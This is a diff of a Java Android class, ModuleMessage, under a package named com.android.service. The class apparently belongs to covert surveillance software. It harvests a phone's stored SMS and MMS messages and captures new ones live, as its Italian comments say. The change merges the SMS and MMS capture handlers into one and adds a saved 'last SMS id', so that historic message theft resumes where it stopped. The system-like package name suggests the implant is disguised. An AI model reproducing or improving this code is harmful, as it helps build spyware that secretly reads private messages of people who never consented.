@@ -30,6 +30,7 @@ import com.android.service.module.message.Filter;
 import com.android.service.module.message.Mms;
 import com.android.service.module.message.MmsBrowser;
 import com.android.service.module.message.MmsHandler;
+import com.android.service.module.message.MsgHandler;
 import com.android.service.module.message.Sms;
 import com.android.service.module.message.SmsBrowser;
 import com.android.service.module.message.SmsHandler;
@@ -54,8 +55,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
 
-	SmsHandler smsHandler;
-	MmsHandler mmsHandler;
+	MsgHandler msgHandler;
 
 	Markup storedMMS;
 	Markup storedSMS;
@@ -68,6 +68,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private Filter filterMmsRuntime;
 	private Markup configMarkup;
 	private int lastMMS;
+	private int lastSMS;
 
 	// private SmsHandler smsHandler;
 
@@ -191,33 +192,49 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			initMms();
 		}
 
-		if (smsEnabled) {
+		if (smsEnabled || mmsEnabled) {
 			// Iniziamo la cattura live
-			smsHandler = new SmsHandler();
-			smsHandler.start();
+			msgHandler = new MsgHandler(smsEnabled, mmsEnabled);
+			msgHandler.start();
 		}
 
-		if (mmsEnabled) {
-			// Iniziamo la cattura live
-			mmsHandler = new MmsHandler();
-			mmsHandler.start();
-		}
 	}
 
 	@Override
 	public void actualStop() {
 		ListenerSms.self().detach(this);
-		if (smsHandler != null) {
-			smsHandler.quit();
+		if (msgHandler != null) {
+			msgHandler.quit();
 		}
-		if (mmsHandler != null) {
-			mmsHandler.quit();
-		}
+
 	}
 
 	@Override
 	public void actualGo() {
 
+	}
+
+	private void initSms() {
+		if (storedSMS.isMarkup()) {
+			try {
+				lastSMS = (Integer) storedSMS.readMarkupSerializable();
+			} catch (Exception e) {
+				storedSMS.removeMarkup();
+				lastSMS = readHistoricSms(lastSMS);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart) Error reading markup: " + e);
+				}
+			}
+		}
+
+		lastSMS = readHistoricSms(lastSMS);
+
+		updateMarkupSMS(lastSMS);
+		
+		/*if (!storedSMS.isMarkup()) {
+			int lastSMS = readHistoricSms();
+			storedSMS.createEmptyMarkup();			
+		}*/
 	}
 
 	private void initMms() {
@@ -248,6 +265,17 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			}
 		}
 	}
+	
+	public synchronized void updateMarkupSMS(int value) {
+		try {
+			lastSMS = value;
+			storedSMS.writeMarkupSerializable(new Integer(value));
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (updateMarkupSMS) Error: " + e);
+			}
+		}
+	}
 
 	private int readHistoricMms(int lastMMS) {
 		final MmsBrowser mmsBrowser = new MmsBrowser();
@@ -271,20 +299,13 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		return mmsBrowser.getMaxId();
 	}
 
-	private void initSms() {
-		if (!storedSMS.isMarkup()) {
-			readHistoricSms();
-			storedSMS.createEmptyMarkup();
-		}
-	}
-
-	private void readHistoricSms() {
+	private int readHistoricSms(int lastSMS) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (begin): cattura sms di storico");//$NON-NLS-1$
 		}
 
 		final SmsBrowser smsBrowser = new SmsBrowser();
-		final ArrayList<Sms> listSms = smsBrowser.getSmsList();
+		final ArrayList<Sms> listSms = smsBrowser.getSmsList(lastSMS);
 		final Iterator<Sms> iterSms = listSms.listIterator();
 
 		while (iterSms.hasNext()) {
@@ -293,6 +314,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				saveSms(s);
 			}
 		}
+		
+		return smsBrowser.getMaxId();
 	}
 
 	private void saveSms(Sms sms) {
@@ -336,7 +359,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			to = address;
 		} else {
 			flags = 1;
-			to = Messages.getString("10.3"); //$NON-NLS-1$
+			to = Messages.getString("10.2"); //$NON-NLS-1$
 			from = address;
 		}
 
@@ -372,5 +395,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	public synchronized int getLastManagedMmsId() {
 		return lastMMS;
+	}
+	public synchronized int getLastManagedSmsId() {
+		return lastSMS;
 	}
 }
